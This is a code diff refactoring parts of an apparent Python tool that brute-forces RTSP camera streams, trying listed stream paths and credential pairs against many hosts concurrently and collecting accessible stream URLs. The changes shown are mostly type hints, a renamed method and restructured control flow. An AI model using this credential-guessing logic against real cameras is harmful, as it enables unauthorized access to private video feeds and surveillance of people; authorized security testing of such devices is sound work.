@@ -27,7 +27,7 @@ paths = [FAKE_PATH] + [ln.rstrip() for ln in open(PATHS_FILE)]
 creds = [ln.rstrip() for ln in open(CREDS_FILE)]
 
 
-def attack(connection, single_path):
+def attack(connection: RTSPConnection, single_path: bool = True):
     results = []
     for path in paths:
         r = connection.get(path)
@@ -36,7 +36,7 @@ def attack(connection, single_path):
             return results
 
         if r.code == 200:
-            url = connection.get_url('/' if path == FAKE_PATH else path)
+            url = connection.url('/' if path == FAKE_PATH else path)
             results.append(url)
 
             if single_path:
@@ -51,7 +51,7 @@ def attack(connection, single_path):
                     return results
 
                 if r.code == 200:
-                    results.append(connection.get_url(path, cred))
+                    results.append(connection.url(path, cred))
                     if single_path:
                         return results
                     break  # one cred per path is enough
@@ -68,12 +68,10 @@ def process_target(target_params: tuple[str, int, bool, str]) -> list[str]:
     host, port, single_path, interface = target_params
 
     with RTSPConnection(host, port, interface) as connection:
-        r = connection.query()
+        if connection.query().code == 200:
+            return attack(connection, single_path)
 
-        if r.code != 200:
-            return []
-
-        return attack(connection, single_path)
+        return []
 
 
 def main(H: str = '', w: int = None, sp: bool = False, i: str = '', d: bool = False, de: bool = False):
@@ -115,6 +113,9 @@ def main(H: str = '', w: int = None, sp: bool = False, i: str = '', d: bool = Fa
                     host, port, *_ = futures[future]
                     res = future.result()
                     progress.update()
+                    if res is None:
+                        print('Result for host is None, giving up')
+                        return
                     results += res
 
     for result in results:
